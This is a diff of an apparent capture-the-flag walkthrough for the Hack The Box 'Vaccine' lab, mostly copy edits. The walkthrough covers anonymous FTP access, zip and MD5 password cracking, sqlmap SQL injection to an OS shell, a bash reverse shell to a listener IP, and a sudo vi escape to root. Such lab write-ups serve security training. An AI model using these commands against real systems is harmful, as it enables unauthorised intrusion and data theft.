@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # Vaccine (Tier 2)
 
 ## <mark style="color:blue;">Description</mark>
@@ -62,17 +48,17 @@ layout:
 
 ***
 
-* I found an HTTP service running on port 80 so I went to the browser to explore the content being deployed and found a website with just a login form. I tried using common credentials but didn't work, so I decided to search for a way to retrieve the correct credentials or to find other possible attack vectors
+* I found an HTTP service running on port 80, so I went to the browser to explore the content being deployed and found a website with just a login form. I tried using common credentials, butthey  didn't work, so I decided to search for a way to retrieve the correct credentials or to find other possible attack vectors
 
 <figure><img src="../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
+To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
 {% endhint %}
 
 ***
 
-* So I opted to review the FTP service that was running on port 21. We tried to log in as the default _anonymous_ user not needing to provide any password, and it worked successfully. Then I listed the files there and found a _backup.zip_ file, which downloaded and closed the connection
+* So I opted to review the FTP service that was running on port 21. We tried to log in as the default _anonymous_ user, not needing to provide any password, and it worked successfully. Then I listed the files there and found a _backup.zip_ file, which I downloaded and closed the connection
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -85,7 +71,7 @@ ftp 10.129.95.174
 <figure><img src="../../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the FTP protocol you can go [here](../../networks/protocols/ftp.md)
+To learn more about the FTP protocol, you can go [here](../../networks/protocols/ftp.md)
 {% endhint %}
 
 ***
@@ -104,7 +90,7 @@ To learn more about the FTP protocol you can go [here](../../networks/protocols/
 
 ***
 
-* Then I tried decompressing the Zip file but it was protected with a password. I tried common and weak passwords but it still didn't work
+* Then I tried decompressing the Zip file, but it was protected with a password. I tried common and weak passwords, but it still didn't work
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -116,7 +102,7 @@ unzip backup.zip
 
 ***
 
-* So I tried cracking the password helping me with the [_johntheripper_](../../cryptography/tools-and-utilities.md#john-the-ripper) set tool using the _zip2john_ script to get the hash of the file. Then I checked the hash had been saved properly and cracked it using a wordlist, in this case, the well-known _rockyou.txt_ dictionary
+* So I tried cracking the password, using the [_John the Ripper_](../../cryptography/tools-and-utilities.md#john-the-ripper) toolkit, in this case the _zip2john_ script to get the hash of the file. Then I checked the hash had been saved properly and cracked it using a wordlist, in this case, the well-known _rockyou.txt_ dictionary
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -134,7 +120,7 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 ***
 
-* I saw it worked successfully recovering the password _741852963_ and after trying again I could decompress the file and extract its content&#x20;
+* I saw it worked successfully, recovering the password _741852963,_ and after trying again, I could decompress the file and extract its content&#x20;
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -146,19 +132,19 @@ unzip backup.zip
 
 ***
 
-* Then I reviewed the two retrieved files and noticed that in the _index.php_ file, which seemed to be the source code of the login page, I found how the site was handling the credentials verification. This let me know the username I was looking for was _admin_ and the password was hashed using MD5. So to know the real value of the password I went to [_Crackstation_](../../cryptography/tools-and-utilities.md#crackstation) and fortunately gave me the value of _qwerty789_ for the password
+* Then I reviewed the two retrieved files and noticed that in the _index.php_ file, which seemed to be the source code of the login page, I found how the site was handling the credentials verification. This let me know the username I was looking for was _admin,_ and the password was hashed using MD5. So, to know the real value of the password, I went to [_Crackstation_](../../cryptography/tools-and-utilities.md#crackstation)_,_ and fortunately gave me the value of _qwerty789_ for the password
 
 <figure><img src="../../.gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about MD5 and other hashing methods you can go [here](../../cryptography/hashing-wip/hashing-wip.md)
+To learn more about MD5 and other hashing methods, you can go [here](../../cryptography/fundamental-concepts/hashing-wip/hashing-wip.md)
 {% endhint %}
 
 ***
 
-* Then I went to the website again and tried to log in with these leaked credentials, seeing how it worked and having access to a _Car Catalogue_ panel
+* Then I went to the website again and tried to log in with these leaked credentials, seeing how it worked, and having access to a _Car Catalogue_ panel
 
 <figure><img src="../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>
 
@@ -178,31 +164,31 @@ To learn more about MD5 and other hashing methods you can go [here](../../crypto
 
 ***
 
-* Exploring the site the only option that I had was a search bar, so I tried using it and noticed that the queries I was putting were being reflected in the URL. So I tried doing some XSS testing but didn't work, so maybe this wasn't the attack vector we were looking for
+* Exploring the site, the only option that I had was a search bar, so I tried using it and noticed that the queries I was putting in were being reflected in the URL. So I tried doing some XSS testing, but it didn't work, so maybe this wasn't the attack vector we were looking for
 
 <figure><img src="../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about Cross-site Scripting (XSS) technique you can go [here](../../web-exploitation/broken-access-control/cross-site-scripting.md)
+To learn more about the Cross-Site Scripting (XSS) technique, you can go [here](../../web-exploitation/broken-access-control/cross-site-scripting.md)
 {% endhint %}
 
 ***
 
-* So as I saw it was working based on queries maybe the page was using SQL internally to retrieve the data from a database. So I tried putting an `'` as input to see if this triggered an error that could give me any clue, and fortunately, it worked giving information about the SQL query. Also, I did some basic SQLi tests to confirm the vulnerability and in fact, it was working
+* So, as I saw it was working based on queries, maybe the page was using SQL internally to retrieve the data from a database. So I tried putting an `'` as input to see if this triggered an error that could give me any clue, and fortunately it worked, giving information about the SQL query. Also, I did some basic SQLi tests to confirm the vulnerability, and in fact, it was working
 
 <figure><img src="../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about SQL Injection (SQLi) you can go [here](../../database-attacks/specific-scenarios/sql-injection/).
+To learn more about SQL Injection (SQLi), you can go [here](../../database-attacks/specific-scenarios/sql-injection/).
 {% endhint %}
 
 ***
 
-* So to make faster the process for abusing this vulnerability, I used [_sqlmap_](../../database-attacks/tools-and-utilities.md#sqlmap) specifying the integrated option it has to try to obtain a shell on the target through the database. But after trying, it didn't give me any results, so maybe I was missing something important
+* So to speed up the process of abusing this vulnerability, I used [_sqlmap_](../../database-attacks/tools-and-utilities.md#sqlmap) specifying the integrated option it has to try to obtain a shell on the target through the database. But after trying, it didn't give me any results, so maybe I was missing something important
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -214,7 +200,7 @@ sqlmap -u 'http://10.129.95.174/dashboard.php?search=a' --os-shell
 
 ***
 
-* To make sure, I tried looking at the petition sent when I used the search engine, using [_FoxyProxy_ ](../../web-exploitation/tools-and-utilities.md#foxyproxy)and [_Burpsuite_](../../web-exploitation/tools-and-utilities.md#burp-suite). By surprise, I found a session cookie was being sent, so I needed to specify this to _sqlmap_ to work properly. After doing this and retrying the attack I successfully got a shell from the system as the database user
+* To make sure, I tried looking at the petition sent when I used the search engine, using [_FoxyProxy_ ](../../web-exploitation/tools-and-utilities.md#foxyproxy)and [_Burp Suite_](../../web-exploitation/tools-and-utilities.md#burp-suite). By surprise, I found a session cookie was being sent, so I needed to specify this to _sqlmap_ to work properly. After doing this and retrying the attack, I successfully got a shell from the system as the database user
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -249,12 +235,12 @@ bash -c "bash -i >& /dev/tcp/10.10.14.117/4444 0>&1
 <figure><img src="../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about how to create a script for a Reverse Shell you can go [here](../../scripting/reverse-shell.md), and to learn about the sanitization process you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
+To learn more about how to create a script for a Reverse Shell, you can go [here](../../scripting/reverse-shell.md), and to learn about the sanitization process, you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
 {% endhint %}
 
 ***
 
-* As the Reverse Shell was still linked to the _sqlmap_ connection, it usually dropped down and I had to redo the process, so I needed to create persistence in the session to work properly. To do this, I started searching in the files from the server in the standard folder _/var/www/html_. There, I found some source files from the web, and looking through them, we found that in the _dashboard.php_ file, the password for the database user was also being leaked
+* As the Reverse Shell was still linked to the _sqlmap_ connection, it usually dropped down, and I had to redo the process, so I needed to create persistence in the session to work properly. To do this, I started searching in the files from the server in the standard folder _/var/www/html_. There, I found some source files from the web, and looking through them, we found that in the _dashboard.php_ file, the password for the database user was also being leaked
 
 <figure><img src="../../.gitbook/assets/image (488).png" alt=""><figcaption><p>snipept</p></figcaption></figure>
 
@@ -262,19 +248,19 @@ To learn more about how to create a script for a Reverse Shell you can go [here]
 
 ***
 
-* So to leverage this, I tried connecting with those credentials via SSH and fortunately it worked, doing again the sanitization process to work more comfortably
+* So to leverage this, I tried connecting with those credentials via SSH, and fortunately it worked, doing the sanitization process again to work more comfortably
 
 <figure><img src="../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the SSH protocol you can go [here](../../networks/protocols/ssh.md)
+To learn more about the SSH protocol, you can go [here](../../networks/protocols/ssh.md)
 {% endhint %}
 
 ***
 
-* Now looking at the folder I was in, I listed the contents and found a _user.txt_ file from which I retrieved the user flag
+* Then, looking at the folder I was in, I listed the contents and found a _user.txt_ file from which I retrieved the user flag
 
 <figure><img src="../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>
 
@@ -300,7 +286,7 @@ To learn more about the SSH protocol you can go [here](../../networks/protocols/
 
 ***
 
-* Knowing this, I used the `vi` command with `sudo`, and as internally _vi_ gives the option to execute external commands using the `:!` operator, I invoked a bash with privileges, which worked perfectly and gained a shell as the _root_ user
+* Knowing this, I used the `vi` command with `sudo` knowing that internally, _vi_ gives the option to execute external commands using the `:!` operator. So, I invoked a bash with privileges, which worked perfectly, and gained a shell as the _root_ user
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -316,12 +302,12 @@ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 <figure><img src="../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the `sudo` abuse for privilege escalation you can go [here](../../penetration-testing/process-stages/post-exploitation/privilege-escalation/linux-privilege-escalation.md#abusing-sudo-execution-permissions)
+To learn more about the `sudo` abuse for privilege escalation, you can go [here](../../penetration-testing/process-stages/post-exploitation/privilege-escalation/linux-privilege-escalation.md#abusing-sudo-execution-permissions)
 {% endhint %}
 
 ***
 
-* Finally, I went to the _/root_ folder to look at its content, noticing a _root.txt_ file, to finally read its content and found the root flag&#x20;
+* Finally, I went to the _/root_ folder to look at its content, noticing a _root.txt_ file, to finally read its content, and found the root flag&#x20;
 
 <figure><img src="../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>
 
